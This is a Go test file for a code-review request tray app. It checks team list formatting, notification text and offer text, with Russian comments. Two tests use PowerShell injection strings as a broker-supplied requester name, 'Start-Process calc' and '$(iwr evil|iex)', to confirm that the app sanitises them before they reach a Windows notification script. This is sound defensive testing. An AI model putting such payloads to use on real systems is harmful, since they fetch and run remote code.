package main

import (
	"strings"
	"testing"
	"time"

	"github.com/goldquality/cross-review/internal/client"
	"github.com/goldquality/cross-review/internal/mrurl"
)

func TestTeamLines(t *testing.T) {
	team := client.Team{
		Online: []client.Teammate{{Name: "аня", State: "busy"}, {Name: "Georgiy", State: "free"}, {Name: "Маша", State: "paused"}},
		Top:    []client.Teammate{{Name: "Петя", Balance: 7}, {Name: "Georgiy", Balance: 3}},
	}
	online, top := teamLines(team, "georgiy")
	if got := strings.Join(online, "|"); got != "аня · ревьюит|Georgiy (ты) · свободен|Маша · пауза" {
		t.Fatal(got)
	}
	if got := strings.Join(top, "|"); got != "1. Петя — 7|2. Georgiy (ты) — 3" {
		t.Fatal(got)
	}
}

func TestTrayNotifierCleansBrokerText(t *testing.T) {
	defer func(f func(string, string)) { systemNotify = f }(systemNotify)
	var got []string
	systemNotify = func(title, text string) { got = append(got, title, text) }
	// Имя просящего пришло от брокера: на Windows оно попало бы в скрипт PowerShell.
	trayNotifier{}.Notify(appTitle, "x\n\"@\nStart-Process calc\n$(iwr evil|iex) просит ревью shop!9")
	if strings.ContainsAny(strings.Join(got, ""), "$`\"\n") {
		t.Fatalf("в уведомление ушло: %q", got)
	}
}

func TestOfferText(t *testing.T) {
	mr, err := mrurl.ParseMR("https://gitlab.example.com/acme/shop/-/merge_requests/9")
	if err != nil {
		t.Fatal(err)
	}
	until := time.Date(2026, 1, 2, 15, 4, 0, 0, time.Local)
	// Имя просящего пришло от брокера: в тост и окно оно попадает почищенным.
	l := offerText(client.JobOffer{MR: mr, Requester: "Аня\n$(iwr evil|iex)", Command: "./dev review <LINK>", Workdir: "/srv/devtools", Until: until})
	if l.who != "Аня (iwr evil|iex) просит отревьюить shop!9" {
		t.Errorf("who: %q", l.who)
	}
	// Команда и папка — из настроек участника, их не чистят: <LINK> остаётся как есть.
	if l.run != "Принять — запущу ./dev review <LINK>\nв /srv/devtools" {
		t.Errorf("run: %q", l.run)
	}
	if l.until != "Не ответишь до 15:04 — задание уйдёт другому" || l.title != "Запрос на ревью" {
		t.Errorf("%+v", l)
	}
}
